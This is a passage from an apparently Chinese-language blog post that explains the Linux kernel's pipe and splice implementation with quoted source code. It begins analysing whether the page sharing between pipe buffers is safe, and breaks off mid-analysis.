class="line">spin_unlock(&amp;inode-&gt;i_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (kill)</span><br><span class="line">free_pipe_info(pipe);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">free_pipe_info</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe)</span></span><br><span class="line">{</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;watch_queue) {</span><br><span class="line">watch_queue_clear(pipe-&gt;watch_queue);</span><br><span class="line">put_watch_queue(pipe-&gt;watch_queue);</span><br><span class="line">}</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">(<span class="type">void</span>) account_pipe_buffers(pipe-&gt;user, pipe-&gt;nr_accounted, <span class="number">0</span>);</span><br><span class="line">free_uid(pipe-&gt;user);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; pipe-&gt;ring_size; i++) {</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + i;</span><br><span class="line"><span class="keyword">if</span> (buf-&gt;ops)</span><br><span class="line">pipe_buf_release(pipe, buf);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;tmp_page)</span><br><span class="line">__free_page(pipe-&gt;tmp_page);</span><br><span class="line">kfree(pipe-&gt;bufs);</span><br><span class="line">kfree(pipe);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="splice"><a href="#splice" class="headerlink" title="splice"></a>splice</h2><p>splice直接完成管道与文件之间的数据传输,避免内核与用户之间的数据拷贝.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE6(splice, <span class="type">int</span>, fd_in, <span class="type">loff_t</span> __user *, off_in,</span><br><span class="line"><span class="type">int</span>, fd_out, <span class="type">loff_t</span> __user *, off_out,</span><br><span class="line"><span class="type">size_t</span>, len, <span class="type">unsigned</span> <span class="type">int</span>, flags)</span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">in</span>, <span class="title">out</span>;</span></span><br><span class="line"><span class="type">long</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!len))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(flags &amp; ~SPLICE_F_ALL))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">error = -EBADF;</span><br><span class="line">in = fdget(fd_in);</span><br><span class="line"><span class="keyword">if</span> (in.file) {</span><br><span class="line">out = fdget(fd_out);</span><br><span class="line"><span class="keyword">if</span> (out.file) {</span><br><span class="line">error = __do_splice(in.file, off_in, out.file, off_out,</span><br><span class="line">len, flags);</span><br><span class="line">fdput(out);</span><br><span class="line">}</span><br><span class="line">fdput(in);</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>__do_splice获取并校验用户参数,管道一端不能设置偏移.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> __do_splice(<span class="keyword">struct</span> file *in, <span class="type">loff_t</span> __user *off_in,</span><br><span class="line"><span class="keyword">struct</span> file *out, <span class="type">loff_t</span> __user *off_out,</span><br><span class="line"><span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">ipipe</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">opipe</span>;</span></span><br><span class="line"><span class="type">loff_t</span> offset, *__off_in = <span class="literal">NULL</span>, *__off_out = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">long</span> ret;</span><br><span class="line"></span><br><span class="line">ipipe = get_pipe_info(in, <span class="literal">true</span>);</span><br><span class="line">opipe = get_pipe_info(out, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ipipe &amp;&amp; off_in)</span><br><span class="line"><span class="keyword">return</span> -ESPIPE;</span><br><span class="line"><span class="keyword">if</span> (opipe &amp;&amp; off_out)</span><br><span class="line"><span class="keyword">return</span> -ESPIPE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (off_out) {</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;offset, off_out, <span class="keyword">sizeof</span>(<span class="type">loff_t</span>)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">__off_out = &amp;offset;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (off_in) {</span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;offset, off_in, <span class="keyword">sizeof</span>(<span class="type">loff_t</span>)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">__off_in = &amp;offset;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">ret = do_splice(in, __off_in, out, __off_out, len, flags);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__off_out &amp;&amp; copy_to_user(off_out, __off_out, <span class="keyword">sizeof</span>(<span class="type">loff_t</span>)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">if</span> (__off_in &amp;&amp; copy_to_user(off_in, __off_in, <span class="keyword">sizeof</span>(<span class="type">loff_t</span>)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>do_splice函数根据两端文件的性质进行dispatch.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Determine where to splice to/from.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">long</span> <span class="title function_">do_splice</span><span class="params">(<span class="keyword">struct</span> file *in, <span class="type">loff_t</span> *off_in, <span class="keyword">struct</span> file *out,</span></span><br><span class="line"><span class="params">       <span class="type">loff_t</span> *off_out, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span>;</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">do_splice</span><br><span class="line">  -&gt;splice_pipe_to_pipe  pipe-&gt;pipe</span><br><span class="line">  -&gt;do_splice_from       file-&gt;pipe</span><br><span class="line">  -&gt;do_splice_to         pipe-&gt;file</span><br></pre></td></tr></tbody></table></figure><p>splice_pipe_to_pipe函数<br>直接看主循环逻辑.分两种情况</p><ul><li>还需要拷贝的长度大于当前ibuf的长度,则直接将该ibuf给obuf,并将ibuf-&gt;op置NULL,类似于移动语义. 这里没有将ibuf-&gt;page置空,直觉上会有问题,但会看一下pipe_write,只会用pipe-&gt;page替换buf-&gt;page后再进行拷贝,所以不会影响到obuf.除非是进行Merge,假设要merge到该ibuf,则该ibuf应该是head-1,又由于i_tail++的操作,此时tail应该是(head-1)+1 ==head.则pipe此时必定是空的,也就不会进行merge操作,排除merge到该buf的可能(说的可能不是很好理解,后面还有一次分析).</li><li>还需要拷贝的长度小于当前ibuf的长度,先调用pipe_buf_get将ibuf-&gt;page引用+1,该页面同时被ibuf和obuf使用.但两者的len,off,flags不同.注意这里需要清除PIPE_BUF_FLAG_CAN_MERGE标志,因为该页在ibuf中还存在可读数据,在outbuf中合并写入会覆盖掉原数据.<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">splice_pipe_to_pipe</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *ipipe,</span></span><br><span class="line"><span class="params">       <span class="keyword">struct</span> pipe_inode_info *opipe,</span></span><br><span class="line"><span class="params">       <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line"><span class="keyword">do</span> {</span><br><span class="line">......</span><br><span class="line">ibuf = &amp;ipipe-&gt;bufs[i_tail &amp; i_mask];</span><br><span class="line">obuf = &amp;opipe-&gt;bufs[o_head &amp; o_mask];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len &gt;= ibuf-&gt;len) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Simply move the whole buffer from ipipe to opipe</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">*obuf = *ibuf;</span><br><span class="line">ibuf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">i_tail++;</span><br><span class="line">ipipe-&gt;tail = i_tail;</span><br><span class="line">input_wakeup = <span class="literal">true</span>;</span><br><span class="line">o_len = obuf-&gt;len;</span><br><span class="line">o_head++;</span><br><span class="line">opipe-&gt;head = o_head;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a reference to this pipe buffer,</span></span><br><span class="line"><span class="comment"> * so we can copy the contents over.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!pipe_buf_get(ipipe, ibuf)) {</span><br><span class="line"><span class="keyword">if</span> (ret == <span class="number">0</span>)</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">*obuf = *ibuf;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Don't inherit the gift and merge flags, we need to</span></span><br><span class="line"><span class="comment"> * prevent multiple steals of this page.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_GIFT;</span><br><span class="line">obuf-&gt;flags &amp;= ~PIPE_BUF_FLAG_CAN_MERGE;</span><br><span class="line"></span><br><span class="line">obuf-&gt;len = len;</span><br><span class="line">ibuf-&gt;offset += len;</span><br><span class="line">ibuf-&gt;len -= len;</span><br><span class="line">o_len = len;</span><br><span class="line">o_head++;</span><br><span class="line">opipe-&gt;head = o_head;</span><br><span class="line">}</span><br><span class="line">ret += o_len;</span><br><span class="line">len -= o_len;</span><br><span class="line">} <span class="keyword">while</span> (len);</span><br><span class="line">......</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul><p>do_splice_from会调用到iter_file_splice_write.以io向量的形式拷贝pipe_buffer数据到文件中,没什么好分析的.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span></span><br><span class="line"><span class="title function_">iter_file_splice_write</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *pipe, <span class="keyword">struct</span> file *out,</span></span><br><span class="line"><span class="params">  <span class="type">loff_t</span> *ppos, <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">splice_desc</span> <span class="title">sd</span> =</span> {</span><br><span class="line">.total_len = len,</span><br><span class="line">.flags = flags,</span><br><span class="line">.pos = *ppos,</span><br><span class="line">.u.file = out,</span><br><span class="line">};</span><br><span class="line"><span class="type">int</span> nbufs = pipe-&gt;max_usage;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bio_vec</span> *<span class="title">array</span> =</span> kcalloc(nbufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> bio_vec),</span><br><span class="line">GFP_KERNEL);</span><br><span class="line"><span class="type">ssize_t</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!<span class="built_in">array</span>))</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">pipe_lock(pipe);</span><br><span class="line"></span><br><span class="line">splice_from_pipe_begin(&amp;sd);</span><br><span class="line"><span class="keyword">while</span> (sd.total_len) {</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span> <span class="title">from</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> head, tail, mask;</span><br><span class="line"><span class="type">size_t</span> left;</span><br><span class="line"><span class="type">int</span> n;</span><br><span class="line"></span><br><span class="line">ret = splice_from_pipe_next(pipe, &amp;sd);</span><br><span class="line"><span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(nbufs &lt; pipe-&gt;max_usage)) {</span><br><span class="line">kfree(<span class="built_in">array</span>);</span><br><span class="line">nbufs = pipe-&gt;max_usage;</span><br><span class="line"><span class="built_in">array</span> = kcalloc(nbufs, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> bio_vec),</span><br><span class="line">GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">array</span>) {</span><br><span class="line">ret = -ENOMEM;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line">mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* build the vector */</span></span><br><span class="line">left = sd.total_len;</span><br><span class="line"><span class="keyword">for</span> (n = <span class="number">0</span>; !pipe_empty(head, tail) &amp;&amp; left &amp;&amp; n &lt; nbufs; tail++, n++) {</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];</span><br><span class="line"><span class="type">size_t</span> this_len = buf-&gt;len;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (this_len &gt; left)</span><br><span class="line">this_len = left;</span><br><span class="line"></span><br><span class="line">ret = pipe_buf_confirm(pipe, buf);</span><br><span class="line"><span class="keyword">if</span> (unlikely(ret)) {</span><br><span class="line"><span class="keyword">if</span> (ret == -ENODATA)</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> done;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="built_in">array</span>[n].bv_page = buf-&gt;page;</span><br><span class="line"><span class="built_in">array</span>[n].bv_len = this_len;</span><br><span class="line"><span class="built_in">array</span>[n].bv_offset = buf-&gt;offset;</span><br><span class="line">left -= this_len;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">iov_iter_bvec(&amp;from, WRITE, <span class="built_in">array</span>, n, sd.total_len - left);</span><br><span class="line">ret = vfs_iter_write(out, &amp;from, &amp;sd.pos, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt;= <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">sd.num_spliced += ret;</span><br><span class="line">sd.total_len -= ret;</span><br><span class="line">*ppos = sd.pos;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* dismiss the fully eaten buffers, adjust the partial one */</span></span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line"><span class="keyword">while</span> (ret) {</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> &amp;pipe-&gt;bufs[tail &amp; mask];</span><br><span class="line"><span class="keyword">if</span> (ret &gt;= buf-&gt;len) {</span><br><span class="line">ret -= buf-&gt;len;</span><br><span class="line">buf-&gt;len = <span class="number">0</span>;</span><br><span class="line">pipe_buf_release(pipe, buf);</span><br><span class="line">tail++;</span><br><span class="line">pipe-&gt;tail = tail;</span><br><span class="line"><span class="keyword">if</span> (pipe-&gt;files)</span><br><span class="line">sd.need_wakeup = <span class="literal">true</span>;</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">buf-&gt;offset += ret;</span><br><span class="line">buf-&gt;len -= ret;</span><br><span class="line">ret = <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">done:</span><br><span class="line">kfree(<span class="built_in">array</span>);</span><br><span class="line">splice_from_pipe_end(pipe, &amp;sd);</span><br><span class="line"></span><br><span class="line">pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sd.num_spliced)</span><br><span class="line">ret = sd.num_spliced;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">EXPORT_SYMBOL(iter_file_splice_write);</span><br></pre></td></tr></tbody></table></figure><p>do_splice_to会调用到copy_page_to_iter_pipe进行实际一页数据的拷贝.<br>这里使用的方式还是共享页面,将该文件缓存页与obuf共享.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> <span class="title function_">copy_page_to_iter_pipe</span><span class="params">(<span class="keyword">struct</span> page *page, <span class="type">size_t</span> offset, <span class="type">size_t</span> bytes,</span></span><br><span class="line"><span class="params"> <span class="keyword">struct</span> iov_iter *i)</span></span><br><span class="line">{</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> i-&gt;pipe;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> p_tail = pipe-&gt;tail;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> p_mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i_head = i-&gt;head;</span><br><span class="line"><span class="type">size_t</span> off;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(bytes &gt; i-&gt;count))</span><br><span class="line">bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (unlikely(!bytes))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!sanity(i))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">off = i-&gt;iov_offset;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line"><span class="keyword">if</span> (off) {</span><br><span class="line"><span class="keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) {</span><br><span class="line"><span class="comment">/* merge with the last one */</span></span><br><span class="line">buf-&gt;len += bytes;</span><br><span class="line">i-&gt;iov_offset += bytes;</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line">}</span><br><span class="line">i_head++;</span><br><span class="line">buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">buf-&gt;ops = &amp;page_cache_pipe_buf_ops;</span><br><span class="line">get_page(page);</span><br><span class="line">buf-&gt;page = page;</span><br><span class="line">buf-&gt;offset = offset;</span><br><span class="line">buf-&gt;len = bytes;</span><br><span class="line"></span><br><span class="line">pipe-&gt;head = i_head + <span class="number">1</span>;</span><br><span class="line">i-&gt;iov_offset = offset + bytes;</span><br><span class="line">i-&gt;head = i_head;</span><br><span class="line">out:</span><br><span class="line">i-&gt;count -= bytes;</span><br><span class="line"><span class="keyword">return</span> bytes;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="共享页面的安全性分析"><a href="#共享页面的安全性分析" class="headerlink" title="共享页面的安全性分析"></a>共享页面的安全性分析</h2><p>可以看到splice调用中大量使用共享页面的形式完成数据的”拷贝”.但这种方式在直观上给人不安全的感觉.<br>详细分析一下三处共享页面.</p><p>初始状态,page蓝色部分代表buffer中已有的数据,白色部分表示空闲空间,红色部分表示本次要splice发送的数据.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405101639507.png"></p><h3 id="第一处"><a href="#第一处" class="headerlink" title="第一处"></a>第一处</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">splice_pipe_to_pipe</span><span class="params">(<span class="keyword">struct</span> pipe_inode_info *ipipe,</span></span><br><span class="line"><span class="params">       <span class="keyword">struct</span> pipe_inode_info *opipe,</span></span><br><span class="line"><span class="params">       <span class="type">size_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br><span class="line">{</span><br><span class="line">......</span><br><span class="line"><span class="keyword">do</span> {</span><br><span class="line">......</span><br><span class="line">ibuf = &amp;ipipe-&gt;bufs[i_tail &amp; i_mask];</span><br><span class="line">obuf = &amp;opipe-&gt;bufs[o_head &amp; o_mask];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (len &gt;= ibuf-&gt;len) {</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Simply move the whole buffer from ipipe to opipe</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">*obuf = *ibuf;</span><br><span class="line">ibuf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">i_tail++;</span><br><span class="line">ipipe-&gt;tail = i_tail;</span><br><span class="line">input_wakeup = <span class="literal">true</span>;</span><br><span class="line">o_len = obuf-&gt;len;</span><br><span class="line">o_head++;</span><br><span class="line">opipe-&gt;head = o_head;</span><br><span class="line">} </span><br></pre></td></tr></tbody></table></figure><p>拷贝完后是这样的.此时ibuf虽然还持有page的指针,但由于buf-&gt;op已经被清空,无法对page进行释放等操作,这一点上是安全的.再来分析两侧对page的读写能力.ibuf端tail已经前移,不能再读取该页,同时head==tail,也不能通过merge操作再次写入该页. 即ibuf端已经完全失去page的访问能力,即使obuf端能通过merge的方式再次写入该页,不会对ibuf端造成任何影响.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202405101642541.png"></p><p>当然ibuf的head可能大于tail,此时虽然能进行merge操作但无法merge到已共享的那张page,仍不具有对它的访问能力.<br><img 